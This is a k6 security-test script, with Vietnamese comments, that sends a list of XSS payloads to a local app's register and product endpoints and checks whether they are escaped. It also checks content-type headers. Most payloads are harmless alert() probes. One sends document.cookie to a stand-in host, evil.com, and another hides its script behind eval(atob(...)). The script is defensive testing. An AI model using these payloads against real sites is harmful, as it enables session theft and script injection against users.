import http from 'k6/http';
import { check } from 'k6';

/**
 * XSS (Cross-Site Scripting) Test
 * Kiểm tra xem ứng dụng có bảo vệ chống XSS hay không
 */

const BASE_URL = 'http://localhost:8080';

// Các payload XSS phổ biến
const xssPayloads = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  "'-alert(1)-'",
  '<script>document.location="http://evil.com/?c="+document.cookie</script>',
  '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
  '<svg/onload=alert("XSS")>',
  '<marquee onstart=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<keygen onfocus=alert("XSS") autofocus>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  'javascript:alert("XSS")',
  '<a href="javascript:alert(\'XSS\')">Click me</a>',
];

export let options = {
  iterations: 1,
  thresholds: {
    checks: ['rate==1.0'],
  },
};

export default function () {
  console.log('=== XSS (Cross-Site Scripting) Test ===');
  
  let vulnerableCount = 0;
  let testedCount = 0;

  // Đăng nhập để lấy token
  const loginRes = http.post(`${BASE_URL}/auth/login`, JSON.stringify({
    username: 'testuser1',
    password: 'test1234',
  }), {
    headers: { 'Content-Type': 'application/json' },
  });

  if (loginRes.status !== 200) {
    console.log('Login failed, skipping some tests');
  }

  const token = loginRes.status === 200 ? loginRes.json('token') : null;
  const authHeaders = {
    headers: {
      'Content-Type': 'application/json',
      'Authorization': token ? `Bearer ${token}` : '',
    },
  };

  // Test 1: XSS trong Register (username)
  console.log('\n--- Test 1: XSS in Register (username) ---');
  xssPayloads.slice(0, 10).forEach((payload, index) => {
    testedCount++;
    
    const res = http.post(`${BASE_URL}/auth/register`, JSON.stringify({
      username: payload,
      password: 'Test1234',
    }), {
      headers: { 'Content-Type': 'application/json' },
    });

    // Kiểm tra xem payload có được reflect lại trong response không mà không bị escape
    const responseBody = res.body ? res.body.toString() : '';
    const isReflected = responseBody.includes(payload) && 
                        !responseBody.includes(encodeURIComponent(payload)) &&
                        !responseBody.includes(payload.replace(/</g, '&lt;'));
    
    if (isReflected) {
      vulnerableCount++;
      console.log(`[VULNERABLE] XSS payload reflected in Register response!`);
    }

    check(res, {
      [`XSS Register Payload ${index + 1} - Properly sanitized`]: () => !isReflected,
    });
  });

  // Test 2: XSS trong Product API (name, description)
  console.log('\n--- Test 2: XSS in Product API ---');
  if (token) {
    xssPayloads.slice(0, 10).forEach((payload, index) => {
      testedCount++;
      
      // Tạo product với XSS payload trong name
      const createRes = http.post(`${BASE_URL}/product`, JSON.stringify({
        name: payload,
        price: 100,
        description: payload,
      }), authHeaders);

      // Kiểm tra response
      const responseBody = createRes.body ? createRes.body.toString() : '';
      const isReflected = responseBody.includes(payload) && 
                          !responseBody.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
      
      if (isReflected && createRes.status === 200) {
        vulnerableCount++;
        console.log(`[VULNERABLE] XSS payload stored in Product! Payload: ${payload.substring(0, 30)}...`);
      }

      check(createRes, {
        [`XSS Product Payload ${index + 1} - Properly handled`]: () => createRes.status !== 200 || !isReflected,
      });

      // Lấy product vừa tạo và kiểm tra xem XSS có được sanitize không
      if (createRes.status === 200) {
        const productId = createRes.json('id');
        if (productId) {
          const getRes = http.get(`${BASE_URL}/product/${productId}`, authHeaders);
          const getBody = getRes.body ? getRes.body.toString() : '';
          
          // Kiểm tra xem XSS payload có được escape không
          const isStoredXSS = getBody.includes('<script>') || 
                              getBody.includes('onerror=') ||
                              getBody.includes('onload=') ||
                              getBody.includes('javascript:');
          
          if (isStoredXSS) {
            vulnerableCount++;
            console.log(`[VULNERABLE] Stored XSS detected in Product ${productId}!`);
          }

          check(getRes, {
            [`Stored XSS Check Product ${productId}`]: () => !isStoredXSS,
          });

          // Xóa product test
          http.del(`${BASE_URL}/product/${productId}`, null, authHeaders);
        }
      }
    });
  }

  // Test 3: Kiểm tra Content-Type header
  console.log('\n--- Test 3: Content-Type Header Check ---');
  testedCount++;
  
  const apiRes = http.get(`${BASE_URL}/product`, authHeaders);
  const contentType = apiRes.headers['Content-Type'] || '';
  const hasProperContentType = contentType.includes('application/json');
  
  if (!hasProperContentType) {
    console.log(`[WARNING] Content-Type is not application/json: ${contentType}`);
  }

  check(apiRes, {
    'Response has proper Content-Type': () => hasProperContentType,
  });

  // Test 4: Kiểm tra X-Content-Type-Options header
  console.log('\n--- Test 4: X-Content-Type-Options Header Check ---');
  testedCount++;
  
  const xContentTypeOptions = apiRes.headers['X-Content-Type-Options'] || '';
  const hasNoSniff = xContentTypeOptions.toLowerCase() === 'nosniff';
  
  if (!hasNoSniff) {
    console.log(`[WARNING] X-Content-Type-Options: nosniff header missing`);
  }

  check(apiRes, {
    'X-Content-Type-Options: nosniff header present': () => hasNoSniff,
  });

  // Summary
  console.log('\n=== XSS Test Summary ===');
  console.log(`Total tests: ${testedCount}`);
  console.log(`Vulnerabilities found: ${vulnerableCount}`);
  console.log(`Status: ${vulnerableCount === 0 ? 'PASSED - No XSS vulnerabilities detected' : 'FAILED - XSS vulnerabilities found!'}`);
}
